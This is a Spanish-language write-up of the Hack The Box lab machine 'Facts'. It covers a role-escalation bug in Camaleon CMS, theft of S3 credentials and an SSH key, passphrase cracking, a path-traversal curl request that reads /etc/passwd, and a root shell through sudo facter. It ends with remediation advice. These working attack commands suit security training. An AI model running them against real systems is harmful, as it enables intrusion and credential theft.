---

title: "WriteUp: Facts | HTB"
date: 2026-07-11
draft: false
tags:
  - Linux
  - Web
  - WordPress
  - CVE-2025-2304
  - S3
  - CVE-2024-46987
  - GTFObins
  - Facter
categories:
  - WriteUps
author: MaxisFront
description: "HTB Facts Machine | Desafío creado por: LazyTitan33"
image: Facts_Shield.png
hideReadingTime: false
---
> Todos los derechos reservados a la **Hack The Box LTD**.


{{< alert info >}}

> Resumen

- Explotación del `CVE-2025-2304` en el `CMS Camaleon 2.9.0` para escalar privilegios mediante asignación masiva de atributos
- Obtención del `API Key` y `Secret Key` a través del `CMS` comprometido
- Acceso al `bucket S3` interno mediante `minio-client`, hallando la clave privada `SSH`
- Explotación de un `Path Traversal` (`CVE-2024-46987`) para la lectura de archivos sensibles del sistema
- Escalada de privilegios mediante el binario `facter` con permisos `sudo`
- Recomendaciones de seguridad para prevenir y mitigar las vulnerabilidades de esta máquina

{{< /alert>}}

#### Habilidades Empleadas

- Enumeración de puertos y servicios
- Enumeración de directorios y arquitectura web
- Explotación de vulnerabilidades en `CMS` (Asignación Masiva de Atributos)
- Interacción con servicios de almacenamiento de objetos (`S3`) mediante `minio-client`
- Aprovechamiento de binarios con permisos `sudo`

#### Herramientas Utilizadas

- ping
- nmap
- minio-client
- python3
- ssh2john
- john
- curl
- ssh
- facter

---
## Escaneo y Análisis de Vulnerabilidades

La plataforma `HTB` nos provee la `IP` objetivo, la cual es la `10.129.16.176`, dirección capaz de ser alcanzada conectándonos a través de la `VPN` que nos asigna la plataforma.

Verificamos si es posible entablar una conexión entre la máquina víctima y la nuestra:

![Arp-Scan output](images/1_Facts-ping-traceroute.png)

  La ruta de la traza ICMP es exitosa. Así pues, el valor del TTL es igual a `63`, lo cual **_podría_** indicar que estamos frente a un OS `Linux/Unix` al ser próximo a 64.
### Reconocimiento de Puertos

Realizamos una enumeración  de los 65535 puertos `TCP` del sistema a través de la herramienta `Nmap`, enfocándonos en los de estado abierto:

``` bash
nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 10.129.16.176
```

![Enumerating ports through Nmap](images/2_Facts-nmap-scan.png)

> <= Importante =>
> En entornos empresariales, enviar grandes cantidades de paquetes `TCP`, `ICMP` o `UDP` suele provocar un congestionamiento  de la red, provocando un ataque `DoS` accidental o ser bloqueados por sistemas de monitorización.

### Enumeración de Puertos

Observamos que los puertos 22 `(SSH)`, 80 `(HTTP)` y  54321 (Actualmente desconocido) se encuentran activos. A partir de este punto podemos enumerar los servicios a través de `Nmap`. 

``` bash
nmap -p22,80,54321 -sCV -oN ports-enum 10.129.16.176
```

![Discovering services and versions through Nmap](images/3_Facts-ports-enumeration.png)

Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:

| Puerto | Servicio |                            Versión                            |                                                                 Notas                                                                 |
| :----: | :------: | :-----------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------: |
|   22   |   ssh    | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) |  Versión desactualizada y potencialmente afectado por diversas vulnerabilidades (`RCE`, entre otros). _No es el objetivo principal_   |
|   80   |   http   |                      Apache httpd 2.4.52                      | Servicio web seriamente desactualizado, afectado potencialmente por `CVE-2022-22720`y `CVE-2022-22719`. _No es el objetivo principal_ |
| 54321  |   http   |                    Golang net/http server                     |                         Posible servidor web estándar o _un sistema de almacenamiento de objetos en la nube_                          |

> Herramientas como `whatweb` (Comando) o `Wappalyzer` (Extensión del navegador) son de gran utilidad cuando deseamos conocer únicamente las tecnologías que hay en un servicio http.

A partir de la tabla podemos definir posibles vectores de aproximación al objetivo:

> - Puerto 22 (`SSH`): Servicio `OpenSSH` seriamente desactualizado, siendo usado posiblemente en una distribución `Ubuntu 22.04 LTS` (`Jammy Jellyfish`). Posible enumeración de usuarios a través del `CVE-2016-6210` y ataque de tipo `DoS` (`CVE-2015-5600`). A simple vista no son vías potenciales de acceso directo al equipo.
>
> - Puerto 80 (`HTTP`): Aplicación web hosteada por medio de un servicio `Apache httpd 2.4.52` desactualizado. Por medio de una enumeración web es posible enumerar otros servicios y posibles accesos al servidor víctima.
> 
> - Puerto 54321 (`HTTP`): Servidor `net/http` escrito en `Go`. Debido a sus usos, puede ser una aplicación de microservicios, una API interna o inclusive una herramienta para entornos de almacenamiento en la nube, permitiendo la comunicación con servicios como `S3` para manejo de `buckets`.

### Enumeración Web

Previo a acceder a la web del objetivo `Facts`, se realiza un `mapping` de la IP objetivo a la página de manera temporal. Esto es posible modificando el archivo `/etc/hosts`:

```bash
sudoedit /etc/hosts
```

![Adding facts IP to the hosts linux file](images/4_Facts-map-ip-into-etc-hosts.png)

Tras acceder a `facts.htb`, podemos observar que es una página web de trivias.

![Facts web homepage](images/5_Facts-homepage-view.png)

A simple vista no observamos ninguna opción capaz de dirigirnos a un panel de administración u otra clase de servicios. Por ello, realizamos una enumeración de direcciones url a través de la herramienta `gobuster` y así tener una visión más amplia de la arquitectura de la página:

```bash
gobuster dir -w wordlist -u "http://facts.htb"
```

![Enumerating url directions through gobuster](images/6_Facts-urls-enumeration.png)

Los resultados nos indican la presencia de un panel de administración en la ruta `http://facts.htb/admin/login`. Accedemos para visualizar el tipo de servicio web.

![Discovering camaleon CMS login pannel](images/7_Facts-camaleon-administration-panel.png)

Observamos que es un panel de administración proveído por un `CMS`. Así pues, la opción de registrar una cuenta está habilitada, por lo comenzamos el proceso.

![Getting into the admin panel with low privileges user](images/8_Facts-admin-panel-low-privileges-user.png)

Al ingresar observamos 2 elementos de interés:

|                                       `CMS Camaleon 2.9.0`                                        |                                                           CVE-2025-2304                                                           |
| :-----------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------: |
| `Camaleon` es un _Content Management System_. Esta versión se ve afectada por el `CVE-2025-2304`. | Esta vulnerabilidades se aprovecha de un `endpoint` llamado `updated_ajax`, permitiendo manipular el rol de uno o varios usuarios |
## Explotación

A partir de este punto nos enfocamos en intentar acceder a través de diversos métodos al sistema del equipo `Facts`.
### Web: CVE-2025-2304

Tras comprobar la existencia de un vector de ataque prometedor, utilizamos una herramienta como lo puede ser `Caido` para la captura y manipulación de peticiones web. Tras activarlo, los dirigimos al perfil de nuestro usuario en el `CMS` e intentamos cambiar nuestra contraseña.

![Capturing the POST request when changing the user password](images/9_Facts-capturing-change-password-post-method.png)

Tras capturar la petición, modificamos el parámetro `password`, añadiendo `[role]=admin`.

![Adding the administrator role to our user](images/10_Facts-modifying-user-role-through-caido.png)

La anterior modificación inyecta el parámetro `role` al cuerpo de la solicitud, escalando así los privilegios de nuestra cuenta para ser usuarios privilegiados.

Tras ello, accedemos la dirección `/admin/settings/site` para entrar a la configuración del sitio. Después, accedemos a la sección `Filesystem Settings`. Aquí podemos descubrir que el servidor posee el servicio `Amazon S3` para el almacenamiento de objetos en la nube, el cual se ejecuta en el puerto `54321` (Previamente descubierto).

![Getting the Access and Secret key from the Amazon S3](images/11_Facts-obtaining-s3-bucket-credentials.png)

Para aprovecharnos del descubrimiento  dentro de `Filesystem Settings`, obtenemos el `access key` y la `secret key`, para posteriormente entablar conexión con el servidor mediante `MiNIO`:

```bash
minio-client alias set facts_htb http://facts.htb:54321/
```

> - `minio-client`: Herramienta dedicada para administrar e interactuar  con sistemas de almacenamiento de objetos con `Amazon S3`

Tras ejecutar el comando, recibimos la siguiente respuesta: `Added facts_htb successfully`

![Setting the alias for the S3 bucket](images/12_Facts-setting-s3-cloud-storage-alias.png)

Después de haber creado un acceso directo al servidor de almacenamiento, podemos listar los `buckets` y objetos dentro del servidor; a través de esta capacidad podemos identificar la existencia del _bucket_ `internal`, que contiene la carpeta `.ssh`.

Listamos el contenido en busca de posibles archivos de valor:

```bash
minio-client ls facts_htb/internal/.ssh
```

![Discovering the SSH private key inside the bucket](images/13_Facts-listing-ssh-keys.png)

Observamos que dentro de la carpeta existe una clave privada (`id_ed25519`) para conexiones `SSH`. Esta, si está protegida por una `passphrase` muy simple, puede ser crackeada rápidamente por un ataque de diccionario, para después acceder de manera remota al servidor víctima de interés.

Para crackearla, primero debemos convertir la clave en un hash capaz de ser utilizado por herramientas como `John the Ripper` o `Hashcat`. En este caso, utilizaremos `John`:

```bash
python3 ssh2john.py id_ed25519 > id.hash
```

> Link de la utilidad: https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py

Tras ello, proseguimos a crackearla:

```bash
john --wordlist=/usr/share/wordlist/rockyou.txt id.hash
```

> - `john`: Herramienta para descifrar y auditar contraseñas.
> - `--wordlist=path/to/wordlist`: Diccionario de palabras o combinaciones utilizadas para el proceso de comparación con el filehash.
> - `<fileHash-to-crack>`:  Contraseña cifrada de forma irreversible.

![Getting passphrase through John The Ripper](images/14_Facts-discovered-ssh-passphrase.png)

Tras haber descubierto la _passphrase_, requerimos descubrir el usuario propietario de la clave privada `SSH`.

### Web: CVE-2024-46987

En variantes específicas de `Camaleon v2.9.0` es posible realizar un `Path Traversal`, de tal manera que podemos acceder a archivos remotos del servidor víctima, como lo es `/etc/passwd`.

Si deseamos realizar la explotación a través de la `CLI`, podemos ejecutar el siguiente comando:

```bash
curl --cookie "_factsapp_session=Cookie ; auth_token=Cookie" "http://facts.htb/admin/media/download_private_file?file=../../../../../../../etc/passwd" | grep "bash"
``` 

> - `-b` / `--cookie`: capacidad de insertar una o más `cookies` de sesión

![Listing the users in the server through the /etc/passwd file](images/15_Facts-passwd-file-content.png)

Observamos que hay 3 usuarios existentes en el equipo: `root`, `trivia` y `william`.

### SSH

Realizando un `password spraying` con los 3 usuarios existentes, descubrimos que la contraseña crackeada es para el usuario `trivia`. Tras ello, ingresamos por `SSH`:

```bash
ssh -i id_ed25519 trivia@10.129.16.176 #dragonballz
```

Tras haber ingresado, listamos los comandos que podemos ejecutar con los privilegios del usuario `root`:

```bash
sudo -l
```

![Listing the binaries with sudo privileges](images/16_Facts-listing-binaries-with-sudo-permissions.png)

Observamos que tenemos la capacidad de ejecutar el comando `facter` (Herramienta enfocada en listar una gran cantidad de datos del equipo en uso).

Investigando en `GTFOBins` identificamos que a través del comando `facter` es posible ejecutar scripts _custom_  escritos en `Ruby`.

![GTFOBins page about the facter binary](images/17_Facts-gftobins-facter.png)

Para aprovecharnos de ello, utilizamos la _flag_ `custom--dir` para abusar de esta propiedad y escribimos el script malicioso:

```bash
echo "require 'facter'; Facter.add(:get_bash){setcode{system('/bin/bash')}}" > exploit.rb
sudo facter --custom-dir /tmp get_bash
```

![Escalating privileges through custom Ruby code](images/18_Facts-getting-root-through-facter-binary.png)

Ahora tenemos una sesión de `bash` como el usuario `root`, tomando control total del sistema `Facts`.

## Impacto

Un atacante con permisos de un usuario común como `trivia` tiene capacidades de:

> - Capacidad de ejecutar `scripts` y establecer sesiones persistentes.
> - Capacidad de enumerar otros sistemas de la red y de realizar movimiento lateral.

El atacante con permisos de administrador obtiene las capacidades de:

> - Entablar persistencia entre sesiones y controlar el tráfico del servidor.
> - Exfiltración de datos confidenciales (DB o almacenamiento interno a través de `S3/MinIO`).
> - Manipulación de `cronjobs` para ejecución de tareas maliciosas.
> - Instalación de `backdoors` a nivel de kernel.

# Resumen

La máquina `Facts` presentó una serie de vulnerabilidades críticas (**No todas expuestas en este WriteUp**) tales como realizar un `Path Traversal` y posteriormente un `RCE`, así como que se presentó un `Credential Reuse` y explotación de un `SUID`, entre otras más. Por ello,  continuación se expondrán los descubrimientos, su gravedad y pautas para evitar esta clase de fallas de seguridad.

### Descubrimientos


> Asignación Masiva de Atributos y Escalada de Privilegios en `CMS Camaleon`

| ID  |                            **Vulnerabilidad**                            |                  **Gravedad**                  |                                                                               Descripción                                                                               |
| :-: | :----------------------------------------------------------------------: | :--------------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| MF1 | CWE-915: Modificación Inadecuada de Atributos Determinados Dinámicamente | {{< exptag "critica">}} Crítica {{</exptag >}} | El `CMS` no valida adecuadamente la petición `POST` al cambiar de contraseña, permitiendo la inyección del parámetro `role` para escalar a privilegios de administrador |

{{< alert error >}} 
Medidas inmediatas

> - Actualizar inmediatamente el sistema `CMS Camaleon` a una versión parcheada y soportada por el cliente.
> - Implementar medidas `Zero Trust` en el lado del servidor para ignorar o rechazar parámetros no autorizados durante la actualización de perfiles de los usuarios (`whitelisting`).
> - Limitar la creación de usuarios de manera estricta si no se requiere la interacción de usuarios externos.

{{< /alert>}}


> Almacenamiento Inseguro de Claves Criptográficas y Uso de Contraseñas Débiles

| ID  |                                                **Vulnerabilidad**                                                |               **Gravedad**               |                                                                         Descripción                                                                         |
| :-: | :--------------------------------------------------------------------------------------------------------------: | :--------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------: |
| MF2 | CWE-1391 y CWE-312: Uso de credenciales débiles y Almacenamiento de información confidencial en texto sin cifrar | {{< exptag "alta">}} alta {{</exptag >}} | Exposición de la clave privada SSH `id_ed25519` en el `bucket S3` local, la cual a su vez protegida por una contraseña susceptible a ataques de diccionario |

{{< alert error >}} 
Medidas inmediatas

> - Implementar permisos de lectura estrictos al bucket `S3` interno, limitando su acceso de manera exclusiva a servicios y direcciones `IP` esenciales a través de un `Firewall` estricto.
> - Revocar la clave SSH comprometida y generar un nuevo par de claves utilizando un `passphrase` robusto (Mínimo 16 caracteres, *utilizando* símbolos y dígitos alfanuméricos).
> - Evitar el almacenamiento de claves criptográficas en servicios de almacenamiento de objectos compartidos.

{{< /alert>}}

> Exposición de Archivos Sensibles mediante `Path Traversal`

| ID  |                               **Vulnerabilidad**                               |               **Gravedad**               |                                                                                   Descripción                                                                                    |
| :-: | :----------------------------------------------------------------------------: | :--------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| MF3 | CWE-22: Limitación Inadecuada de un Nombre de Ruta a un Directorio Restringido | {{< exptag "alta">}} Alta {{</exptag >}} | El endpoint de descarga de archivos privados permite el uso de secuencias de salto de directorio (`../`), exponiendo archivos críticos del sistema operativo como `/etc/passwd`. |

{{< alert error >}} 
Medidas inmediatas

> - Implementar validación y sanitización estricta del parámetro `file`, restringiendo secuencias de carácteres especiales como `../` y `%2e%2e%2f`.
> - Verificar que la ruta absoluta insertada solicite archivos dentro de directorios permitidos antes de procesar el archivo solicitado.

{{< /alert>}}

> Gestión Inadecuada de Privilegios Sudo

| ID  |             **Vulnerabilidad**             |                  **Gravedad**                  |                                                                       Descripción                                                                       |
| :-: | :----------------------------------------: | :--------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------: |
| MF4 | CWE-269: Gestión inadecuada de Privilegios | {{< exptag "critica">}} Crítica {{</exptag >}} | Usuario `trivia` capaz de ejecutar el binario `facter` como `root`, permitiendo la inyección de código Ruby y así ejecutar comandos como administrador. |

{{< alert error >}} 
Medidas inmediatas

> - Remover el binario `facter` de las directivas de permisos de ejecución sin contraseña para el usuario `trivia` en el archivo `/etc/sudoers`.
> - Si la ejecución forma parte de la lógica de negocios, crear un `wrapper` intermediario que limite y valide los argumentos insertados por el usuario `trivia` para limitar argumentos peligrosos como `--custom-dir`.
> - Auditar periódicamente el archivo de configuración `sudoers`, verificando que se cumpla el principio del mínimo privilegio.

{{< /alert>}}
